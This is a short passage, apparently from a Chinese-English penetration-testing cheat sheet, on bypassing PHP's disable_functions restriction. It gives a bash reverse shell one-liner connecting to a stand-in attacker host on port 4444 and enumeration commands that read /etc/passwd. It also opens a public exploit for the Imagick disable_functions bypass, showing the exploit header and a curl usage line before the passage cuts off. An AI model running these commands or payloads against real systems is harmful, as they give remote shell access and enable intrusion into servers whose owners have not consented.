ell outside open basedir) 反弹 Shell – bash -c &quot;bash -i &gt;&amp; /dev/tcp/attacker/4444 0&gt;&amp;1&quot; Enumerate – id; uname -a; cat /etc/passwd # 命令 / 载荷 / 操作片段 # 1. Imagick &lt;= 3.3.0 ‑ PHP &gt;= 5.4 disable functions 绕过 1234567891011121314151617181920212223242526272829# Exploit Title : PHP Imagick disable_functions bypass# Exploit Author: RicterZ (ricter@chaitin.com)# Versions : Imagick &lt;= 3.3.0 | PHP &gt;= 5.4# Tested on : Ubuntu 12.04 (ImageMagick 6.7.7)# Usage : curl &quot;http://target/exploit.php?cmd=id&quot;&lt;?php// Print the local hardening statusprintf(&quot;Disable functions: %s
